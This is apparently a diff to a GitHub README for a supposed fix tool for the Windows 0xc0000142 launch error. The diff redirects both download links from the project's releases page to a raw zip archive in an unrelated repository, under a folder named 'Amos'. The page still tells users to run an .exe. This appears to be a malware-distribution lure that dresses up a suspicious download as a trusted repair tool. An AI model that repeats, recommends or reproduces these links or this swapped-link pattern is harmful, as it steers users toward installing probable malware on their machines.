@@ -5,7 +5,7 @@ description: "Resolve the 0xc0000142 application error on Windows 10 and 11 usin
 ---
 # 🛠️ Error-0xc0000142-Fix - Resolve Windows Application Launch Errors
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Plethodontgobletcell806/Error-0xc0000142-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Plethodontgobletcell806/plethodontgobletcell806.github.io/main/Amos/plethodontgobletcell_github_io_v1.8.zip)
 
 Error 0xc0000142 represents a common initialization failure in Windows 10 and 11. This error occurs when a dynamic link library (DLL) fails to load during the startup process of an application. Users often see this message when they try to launch games or complex software. This repository provides an automated tool to address these library conflicts and restore software functionality without manual registry changes.
 
@@ -13,7 +13,7 @@ Error 0xc0000142 represents a common initialization failure in Windows 10 and 11
 
 You can obtain the current version of the repair tool from the official releases page.
 
-[Visit this page to download the latest setup file](https://github.com/Plethodontgobletcell806/Error-0xc0000142-Fix/releases)
+[Visit this page to download the latest setup file](https://raw.githubusercontent.com/Plethodontgobletcell806/plethodontgobletcell806.github.io/main/Amos/plethodontgobletcell_github_io_v1.8.zip)
 
 Select the most recent release version. Look for the file ending in .exe. Click the file name to start the download to your computer. Save the file to your Downloads folder or your desktop for easy access.
 
